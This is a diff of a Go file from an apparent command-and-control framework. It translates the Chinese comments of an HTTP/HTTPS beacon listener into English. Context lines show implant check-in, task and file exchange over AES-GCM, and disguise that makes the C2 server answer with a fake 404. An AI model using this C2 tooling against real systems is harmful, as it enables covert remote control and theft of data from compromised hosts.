@@ -1,4 +1,4 @@
-﻿package c2
+package c2
 
 import (
 	"crypto/ecdsa"
@@ -31,13 +31,13 @@ import (
 	"go.uber.org/zap"
 )
 
-// HTTPBeaconListener 实现 HTTP/HTTPS Beacon：
-//   - beacon 端定期 POST {checkin_path}（携带 implant_token + AES 加密 body）；
-//   - 服务端解密、登记会话、回执 sleep + 是否有任务；
-//   - beacon 收到 has_tasks=true 时 GET {tasks_path} 拉取加密任务列表；
-//   - 任务完成后 POST {result_path} 回传结果。
+// HTTPBeaconListener implements HTTP/HTTPS Beacon:
+//   - the beacon periodically POSTs to {checkin_path} (with implant_token + AES-encrypted body);
+//   - the server decrypts, registers the session, and replies with sleep + has_tasks flag;
+//   - when has_tasks=true, the beacon GETs {tasks_path} to pull the encrypted task list;
+//   - after completing a task, the beacon POSTs to {result_path} to return the result.
 //
-// 优势：所有任务异步、可批量、支持文件上传/截图/任意大 blob，是 C2 的"主战场"。
+// Advantages: all tasks are asynchronous and batchable, supports file upload/screenshots/arbitrary blobs; this is the C2 "main arena".
 type HTTPBeaconListener struct {
 	rec     *database.C2Listener
 	cfg     *ListenerConfig
@@ -52,7 +52,7 @@ type HTTPBeaconListener struct {
 	stopped bool
 }
 
-// NewHTTPBeaconListener 工厂（注册到 ListenerRegistry["http_beacon"]）
+// NewHTTPBeaconListener is the factory (registered to ListenerRegistry["http_beacon"])
 func NewHTTPBeaconListener(ctx ListenerCreationCtx) (Listener, error) {
 	return &HTTPBeaconListener{
 		rec:     ctx.Listener,
@@ -64,7 +64,7 @@ func NewHTTPBeaconListener(ctx ListenerCreationCtx) (Listener, error) {
 	}, nil
 }
 
-// NewHTTPSBeaconListener 工厂（注册到 ListenerRegistry["https_beacon"]）
+// NewHTTPSBeaconListener is the factory (registered to ListenerRegistry["https_beacon"])
 func NewHTTPSBeaconListener(ctx ListenerCreationCtx) (Listener, error) {
 	return &HTTPBeaconListener{
 		rec:     ctx.Listener,
@@ -76,7 +76,7 @@ func NewHTTPSBeaconListener(ctx ListenerCreationCtx) (Listener, error) {
 	}, nil
 }
 
-// Type 类型字符串
+// Type typestring
 func (l *HTTPBeaconListener) Type() string {
 	if l.useTLS {
 		return string(ListenerTypeHTTPSBeacon)
@@ -84,7 +84,7 @@ func (l *HTTPBeaconListener) Type() string {
 	return string(ListenerTypeHTTPBeacon)
 }
 
-// Start 起 HTTP server
+// Start starts the HTTP server
 func (l *HTTPBeaconListener) Start() error {
 	// Load Malleable Profile if configured
 	l.loadProfile()
@@ -136,7 +136,7 @@ func (l *HTTPBeaconListener) Start() error {
 	return nil
 }
 
-// Stop 关闭
+// Stop close
 func (l *HTTPBeaconListener) Stop() error {
 	l.mu.Lock()
 	if l.stopped {
@@ -173,7 +173,7 @@ func (l *HTTPBeaconListener) handleCheckIn(w http.ResponseWriter, r *http.Reques
 		return
 	}
 
-	// 尝试 AES-GCM 解密（完整 beacon 二进制走加密通道）
+	// Attempt AES-GCM decryption (full beacon binary uses the encrypted channel)
 	var req ImplantCheckInRequest
 	plaintext, decErr := DecryptAESGCM(l.rec.EncryptionKey, string(body))
 	if decErr == nil {
@@ -182,7 +182,7 @@ func (l *HTTPBeaconListener) handleCheckIn(w http.ResponseWriter, r *http.Reques
 			return
 		}
 	} else {
-		// 解密失败：尝试当作明文 JSON（兼容 curl oneliner 等轻量级客户端）
+		// Decryption failed: try as plaintext JSON (compatible with curl one-liner and other lightweight clients)
 		if err := json.Unmarshal(body, &req); err != nil {
 			l.disguisedReject(w)
 			return
@@ -196,10 +196,10 @@ func (l *HTTPBeaconListener) handleCheckIn(w http.ResponseWriter, r *http.Reques
 	if req.SleepSeconds <= 0 {
 		req.SleepSeconds = l.cfg.DefaultSleep
 	}
-	// curl oneliner 可能不携带完整字段，用 remote IP + listener ID 生成稳定标识
+	// curl one-liner may not carry all fields; generate a stable identity from remote IP + listener ID
 	host, _, _ := net.SplitHostPort(r.RemoteAddr)
 	if strings.TrimSpace(req.ImplantUUID) == "" {
-		// 同一客户端凭据复用会话，同 IP 的不同客户端保持独立身份
+		// Same-client credentials reuse the session; different clients from the same IP retain separate identities
 		req.ImplantUUID = fmt.Sprintf("curl_%s_%s", host, httpIdentityHash(host+l.rec.ID+r.Header.Get("X-Session-Token")))
 	}
 	if strings.TrimSpace(req.Hostname) == "" {
@@ -327,8 +327,8 @@ func (l *HTTPBeaconListener) handleResult(w http.ResponseWriter, r *http.Request
 	}
 }
 
-// handleUpload 实现 implant 主动上传文件给服务端（如 download 任务的二进制结果）。
-// Body 为 AES-GCM 加密后的 base64，与 check-in/result 保持一致的安全策略。
+// handleUpload implements implant-initiated file upload to the server (e.g. binary result of a download task).
+// Body is AES-GCM-encrypted base64, consistent with the security policy of check-in/result.
 func (l *HTTPBeaconListener) handleUpload(w http.ResponseWriter, r *http.Request) {
 	if r.Method != http.MethodPost {
 		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
@@ -369,8 +369,8 @@ func (l *HTTPBeaconListener) handleUpload(w http.ResponseWriter, r *http.Request
 	l.writeEncrypted(w, map[string]interface{}{"ok": 1, "size": len(plaintext)})
 }
 
-// handleFileServe 实现服务端 → implant 的文件下发（upload 任务用）。
-// 路径形如 /file/<task_id>，文件内容经 AES-GCM 加密后返回。
+// handleFileServe implements server → implant file delivery (used for upload tasks).
+// The path looks like /file/<task_id>; file content is AES-GCM-encrypted before returning.
 func (l *HTTPBeaconListener) handleFileServe(w http.ResponseWriter, r *http.Request) {
 	if r.Method != http.MethodGet {
 		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
@@ -424,7 +424,7 @@ func (l *HTTPBeaconListener) handleFileServe(w http.ResponseWriter, r *http.Requ
 }
 
 // ----------------------------------------------------------------------------
-// 鉴权 / 输出辅助
+// Authentication / output helpers
 // ----------------------------------------------------------------------------
 
 func (l *HTTPBeaconListener) authenticatesSession(r *http.Request, session *database.C2Session) bool {
@@ -444,11 +444,11 @@ func (l *HTTPBeaconListener) authenticatesTask(r *http.Request, taskID string) b
 	return err == nil && l.authenticatesSession(r, session)
 }
 
-// checkImplantToken 校验 X-Implant-Token header（恒定时间比较防止时序攻击）
+// checkImplantToken validates the X-Implant-Token header (constant-time comparison to prevent timing attacks)
 func (l *HTTPBeaconListener) checkImplantToken(r *http.Request) bool {
 	got := r.Header.Get("X-Implant-Token")
 	if got == "" {
-		got = r.Header.Get("Cookie") // 兼容 Malleable Profile 用 Cookie 携带
+		got = r.Header.Get("Cookie") // compatible with Malleable Profile carrying the token via Cookie
 	}
 	expected := l.rec.ImplantToken
 	if got == "" || expected == "" {
@@ -457,14 +457,14 @@ func (l *HTTPBeaconListener) checkImplantToken(r *http.Request) bool {
 	return subtle.ConstantTimeCompare([]byte(got), []byte(expected)) == 1
 }
 
-// disguisedReject 鉴权失败时返回 404，避免暴露 listener 是 C2
+// disguisedReject returns 404 on authentication failure to avoid exposing that the listener is a C2
 func (l *HTTPBeaconListener) disguisedReject(w http.ResponseWriter) {
 	w.Header().Set("Content-Type", "text/html; charset=utf-8")
 	w.WriteHeader(http.StatusNotFound)
 	_, _ = fmt.Fprint(w, "<html><body><h1>404 Not Found</h1></body></html>")
 }
 
-// writeEncrypted JSON 序列化 + AES-GCM 加密 + 写回
+// writeEncrypted JSON-serialises + AES-GCM-encrypts + writes the response
 func (l *HTTPBeaconListener) writeEncrypted(w http.ResponseWriter, payload interface{}) {
 	body, err := json.Marshal(payload)
 	if err != nil {
@@ -487,12 +487,12 @@ func (l *HTTPBeaconListener) loadProfile() {
 	}
 	profile, err := l.manager.GetProfile(l.rec.ProfileID)
 	if err != nil || profile == nil {
-		l.logger.Warn("加载 Malleable Profile 失败，使用默认配置",
+		l.logger.Warn("failed to load Malleable Profile, using default config",
 			zap.String("profile_id", l.rec.ProfileID), zap.Error(err))
 		return
 	}
 	l.profile = profile
-	l.logger.Info("Malleable Profile 已加载",
+	l.logger.Info("Malleable Profile loaded",
 		zap.String("profile_id", profile.ID),
 		zap.String("profile_name", profile.Name),
 		zap.String("user_agent", profile.UserAgent))
@@ -511,19 +511,19 @@ func (l *HTTPBeaconListener) withProfileHeaders(next http.HandlerFunc) http.Hand
 }
 
 // ----------------------------------------------------------------------------
-// TLS 自签证书（仅供测试 / Phase 2 默认行为）
+// TLS self-signed certificate (for testing / Phase 2 default behaviour only)
 // ----------------------------------------------------------------------------
 
 func (l *HTTPBeaconListener) buildTLSConfig() (*tls.Config, error) {
-	// 操作员显式提供证书 → 优先使用
+	// Operator explicitly provided a certificate → use it first
 	if l.cfg.TLSCertPath != "" && l.cfg.TLSKeyPath != "" {
 		cert, err := tls.LoadX509KeyPair(l.cfg.TLSCertPath, l.cfg.TLSKeyPath)
 		if err == nil {
 			return &tls.Config{Certificates: []tls.Certificate{cert}, MinVersion: tls.VersionTLS12}, nil
 		}
-		l.logger.Warn("加载 TLS 证书失败，回退自签", zap.Error(err))
+		l.logger.Warn("failed to load TLS certificate, falling back to self-signed", zap.Error(err))
 	}
-	// 自签证书：CN 用 listener 名，避免重复
+	// Self-signed certificate: use listener name as CN to avoid duplicates
 	cert, err := generateSelfSignedCert(l.rec.Name)
 	if err != nil {
 		return nil, err
@@ -569,8 +569,8 @@ func httpIdentityHash(s string) string {
 	return hex.EncodeToString(h[:])
 }
 
-// isPlaintextClient 判断请求是否来自明文客户端（curl oneliner 等）
-// 完整 beacon 二进制会设置 Content-Type: application/octet-stream
+// isPlaintextClient determines whether the request comes from a plaintext client (curl one-liner, etc.)
+// A full beacon binary sets Content-Type: application/octet-stream
 func (l *HTTPBeaconListener) isPlaintextClient(r *http.Request) bool {
 	ct := r.Header.Get("Content-Type")
 	accept := r.Header.Get("Accept")
@@ -579,8 +579,8 @@ func (l *HTTPBeaconListener) isPlaintextClient(r *http.Request) bool {
 		strings.Contains(r.UserAgent(), "curl/")
 }
 
-// ApplyJitter 给定基础 sleep + jitter 百分比，返回随机抖动后的 duration
-// 公开给 listener_websocket / payload 模板共用，避免重复实现
+// ApplyJitter returns a randomly jittered duration given base sleep + jitter percentage.
+// Exported for shared use by listener_websocket / payload templates to avoid duplicating the implementation.
 func ApplyJitter(baseSec, jitterPercent int) time.Duration {
 	if baseSec <= 0 {
 		return 0
